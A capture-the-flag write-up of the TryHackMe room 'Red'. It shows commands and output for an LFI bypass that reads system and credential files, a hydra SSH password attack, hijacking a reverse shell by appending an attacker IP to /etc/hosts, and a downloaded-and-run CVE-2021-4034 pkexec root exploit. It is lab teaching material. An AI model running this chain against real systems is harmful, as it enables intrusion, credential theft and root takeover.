| Category          | Details                                     |
|-------------------|---------------------------------------------|
| 📝 **Name**       | [Red](https://tryhackme.com/room/redisl33t) |  
| 🏷 **Type**       | THM Challenge                               |
| 🖥 **OS**         | Linux                                       |
| 🎯 **Difficulty** | Easy                                        |
| 📁 **Tags**       | PHP, LFI, hashcat, hydra, CVE-2021-4034     |

# Scan
```
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
|_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
80/tcp open  http
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
```

# Solution

#### Discover `page` HTTP query param in `index.php`
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ curl -I http://$TARGET
HTTP/1.1 302 Found
Date: Tue, 09 Dec 2025 12:32:49 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: /index.php?page=home.html
Content-Type: text/html; charset=UTF-8
```
As this parameter accepts filename it might be vulnerable to LFI.

#### Identify LFI vulnerability in `index.php`
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ curl http://$TARGET/index.php?page=index.php   
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```
We could read `index.php` itself, and it's analysis shows that `page` HTTP query parameter is passed to `readfile` function prior to simple sanitization. We could bypass this sanitization by using `file://` stream wrapper.

#### Confirm exploitable LFI vulnerability in `index.php`
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ curl http://$TARGET/index.php?page=file:///etc/passwd               
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

#### Prepare simple LFI exploit 
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ { cat <<'EOF' > lfi.sh
curl -s http://$TARGET/index.php?page=file://$1
EOF
} && chmod +x lfi.sh
```

#### List users with `/home` directory
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ ./lfi.sh /etc/passwd | grep '/home'
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
red:x:1001:1001::/home/red:/bin/bash
```

#### Access `.bash_history` of user `blue`
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ ./lfi.sh /home/blue/.bash_history
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```
We can see that `hashcat` rules are applied on content of `.reminder` to generate dictionary. 

#### Exfiltrate `.reminder` file
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ ./lfi.sh /home/blue/.reminder > .reminder && cat .reminder
sup3r_p@s$w0rd!
```

#### Generate dictionary using approach from `.bash_history`
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ hashcat --stdout .reminder -r /usr/share/hashcat/rules/best66.rule > passlist.txt && cat passlist.txt 
sup3r_p@s$w0rd!
!dr0w$s@p_r3pus
SUP3R_P@S$W0RD!
Sup3r_p@s$w0rd!
sup3r_p@s$w0rd!0
sup3r_p@s$w0rd!1
sup3r_p@s$w0rd!2
sup3r_p@s$w0rd!3
<SNIP>
```

#### Prepare users list for dictionary attack against SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ cat <<'EOF'> users.txt
red
blue
EOF
```

#### Use `hydra` to conduct dictionary attack against SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ hydra -L users.txt -P passlist.txt ssh://$TARGET                                              
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-09 21:54:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 132 login tries (l:2/p:66), ~9 tries per task
[DATA] attacking ssh://10.82.129.240:22/
[22][ssh] host: 10.82.129.240   login: blue   password: sup3r_p@s$w0rd!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-09 21:54:34
```

#### Use discovered credentials to gain access over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ ssh blue@$TARGET
<SNIP>
blue@red:~$ id
uid=1000(blue) gid=1000(blue) groups=1000(blue)
```

#### Capture 1st flag
```
blue@red:~$ cat /home/blue/flag1 
THM{****************************}
```

#### Locate 2nd flag
```
blue@red:~$ ls -la /home/red/flag2 
-rw-r----- 1 root red 41 Aug 14  2022 /home/red/flag2
```
To read 2nd flag we need to escalate to at least `red` user.

#### Discover reverse shell connection to `redrules.thm:9001` running for `red` user
```
blue@red:~$ ps aux | grep red
red        38338  0.0  0.0   6972  2716 ?        S    21:22   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
red        39339  0.0  0.0   6972  2668 ?        S    21:23   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```
`ps` executed 'after a while' yields different PIDs
```
blue@red:~$ ps aux | grep red
red        50454  0.0  0.0   6972  2712 ?        S    21:26   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
red        50479  0.0  0.0   6972  2704 ?        S    21:27   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
red        50510  0.0  0.0   6972  2656 ?        S    21:28   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```
Meaning that reverse shell connection process is being recreated, as thus connection is being re-established. We could try to 'hijack' this connection if we could control routing for `redrules.thm`.

#### Check write permissions to `/etc/hosts`
```
blue@red:~$ ls -l /etc/hosts && lsattr /etc/hosts
-rw-r--rw- 1 root adm 242 Dec  9 22:24 /etc/hosts
-----a--------e----- /etc/hosts
```
It seems that we could control routing with write permissions to `/etc/hosts`, however we could only append to this file. `/etc/hosts` static hostname resolution is executed in top to bottom order (first match wins). However, Bash’s `/dev/tcp` feature uses `getaddrinfo()`, which returns all matching host entries and then attempts to connect in order until one succeeds.

#### Start `netcat` to hijack reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ nc -lvnp 9001   
listening on [any] 9001 ...
```

#### Append bind for `redrules.thm` to attacker machine
```
blue@red:~$ echo "192.168.132.170 redrules.thm" >> /etc/hosts && cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
192.168.132.170 redrules.thm
```
Wait for reverse shell connection to be reestablished.

#### Confirm reverse shell hijacked
```
connect to [192.168.132.170] from (UNKNOWN) [10.82.129.240] 39054
bash: cannot set terminal process group (53948): Inappropriate ioctl for device
bash: no job control in this shell
red@red:~$ id
id
uid=1001(red) gid=1001(red) groups=1001(red)
```

#### Capture 2nd flag
```
red@red:~$ cat /home/red/flag2
cat /home/red/flag2
THM{***********************************}
```

#### Discover vulnerable `pkexec` with SUID
Binary discovered with `linepeas.sh`
```
-rwsr-xr-x 1 root root 31K Aug 14  2022 /home/red/.git/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
```
This `pkexec` is vulnerable to [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034) and could be [exploited](https://github.com/ryaagard/CVE-2021-4034) to escalate privileges.

#### Check if `gcc` is available
```
red@red:~$ gcc
gcc

Command 'gcc' not found, but can be installed with:

apt install gcc

Please ask your administrator.
```
With no `gcc` will need to build exploit locally.

#### Check OS version
```
red@red:~$ cat /etc/os-release
cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```
We will use exact same system to build exploit

#### Build [exploit](https://github.com/ryaagard/CVE-2021-4034) using Ubuntu 20.04 docker image and host it over HTTP
We need to overwrite `BIN` macro to point to vulnerable version of `pkexec` on target.
```
┌──(magicrc㉿perun)-[~/attack/THM Red]
└─$ git clone -q https://github.com/ryaagard/CVE-2021-4034.git && cd CVE-2021-4034 && \
sed -i 's|^#define BIN ".*"|#define BIN "/home/red/.git/pkexec"|' exploit.c && \
docker run --rm -v "$PWD":/src -w /src ubuntu:20.04 bash -c "apt update && apt install -y build-essential && make all" && \
python3 -m http.server 80
<SNIP>
gcc -shared -o evil.so -fPIC evil-so.c
evil-so.c: In function 'gconv_init':
evil-so.c:10:5: warning: implicit declaration of function 'setgroups'; did you mean 'getgroups'? [-Wimplicit-function-declaration]
   10 |     setgroups(0);
      |     ^~~~~~~~~
      |     getgroups
evil-so.c:12:5: warning: null argument where non-null required (argument 2) [-Wnonnull]
   12 |     execve("/bin/sh", NULL, NULL);
      |     ^~~~~~
gcc exploit.c -o exploit
exploit.c: In function 'main':
exploit.c:25:5: warning: implicit declaration of function 'execve' [-Wimplicit-function-declaration]
   25 |     execve(BIN, argv, envp);
      |     ^~~~~~
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Download and execute exploit to escalate to `root` user
```
red@red:~$ cd /tmp && wget http://192.168.132.170/evil.so && wget http://192.168.132.170/exploit && chmod +x exploit && ./exploit
<SNIP>
id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture 3rd flag
```
cat /root/flag3
THM{*****************}
```
